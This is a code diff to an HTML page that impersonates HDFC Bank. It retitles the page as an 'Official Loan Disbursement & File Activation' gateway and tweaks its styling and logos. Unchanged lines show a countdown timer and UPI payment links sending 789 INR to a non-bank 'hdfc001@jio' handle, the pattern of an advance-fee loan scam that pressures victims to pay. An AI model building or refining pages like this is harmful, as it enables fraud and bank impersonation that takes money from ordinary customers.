@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HDFC Bank - Secure Payment Gateway</title>
+    <title>HDFC Bank - Official Loan Gateway</title>
     <style>
         :root {
             --hbfc-blue: #004c8f;
@@ -15,7 +15,7 @@
         
         /* Header */
         .header { background: white; padding: 15px; text-align: center; border-bottom: 3px solid var(--hbfc-blue); box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .header h2 { margin: 0; color: var(--hbfc-blue); font-size: 19px; text-transform: uppercase; letter-spacing: 1px; }
+        .header h2 { margin: 0; color: var(--hbfc-blue); font-size: 17px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 800; }
 
         .timer-box { 
             background: #fff3e0; color: #e65100; padding: 12px; text-align: center; 
@@ -37,7 +37,6 @@
         
         .upi-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 20px; }
         .upi-item { text-align: center; cursor: pointer; text-decoration: none; }
-        /* Adjusted icon size and styling for 100% visibility */
         .upi-item img { width: 48px; height: 48px; object-fit: contain; margin-bottom: 5px; transition: transform 0.2s; }
         .upi-item:active img { transform: scale(0.9); }
         .upi-item span { display: block; font-size: 11px; color: #444; font-weight: 600; }
@@ -74,7 +73,7 @@
 <body>
 
     <div class="header">
-        <h2>Secure Activation Payment</h2>
+        <h2>Official Loan Disbursement & File Activation</h2>
     </div>
 
     <div class="timer-box" id="timer">23:59:59</div>
@@ -92,7 +91,7 @@
             <h4>Select App to Pay</h4>
             <div class="upi-grid">
                 <a href="upi://pay?pa=hdfc001@jio&pn=HDFC&am=789&cu=INR" class="upi-item">
-                    <img src="https://img.icons8.com/color/144/phonepe.png" alt="PhonePe">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/PhonePe_Logo.svg/1024px-PhonePe_Logo.svg.png" alt="PhonePe">
                     <span>PhonePe</span>
                 </a>
                 <a href="upi://pay?pa=hdfc001@jio&pn=HDFC&am=789&cu=INR" class="upi-item">
